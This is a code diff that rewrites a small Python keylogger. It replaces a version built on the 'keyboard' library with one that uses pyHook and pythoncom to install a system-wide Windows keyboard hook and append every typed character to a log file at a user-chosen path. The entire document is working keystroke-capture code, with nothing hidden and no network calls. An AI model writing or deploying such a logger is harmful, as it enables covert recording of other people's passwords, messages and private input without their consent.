@@ -1,12 +1,26 @@
-import keyboard
+import sys
+import os
+import win32api
+import pythoncom
+import pyHook
 
-log_file = "keylog.txt"
+log_file_path = input("Enter the path where you want to save the log file (e.g., C:\\Logs\\keylog.txt): ")
 
-def on_key_event(e):
-    if e.event_type == keyboard.KEY_DOWN:
-        with open(log_file, "a") as f:
-            f.write(e.name + "\n")
+try:
+    f = open(log_file_path, 'a')
+    f.close()
+except:
+    f = open(log_file_path, 'w')
+    f.close()
 
-keyboard.hook(on_key_event)
-keyboard.wait()
+def OnKeyboardEvent(event):
+    with open(log_file_path, 'a') as f:
+        f.write(chr(event.Ascii))
+    return True
+
+hook = pyHook.HookManager()
+hook.KeyDown = OnKeyboardEvent
+hook.HookKeyboard()
+
+pythoncom.PumpMessages()
 
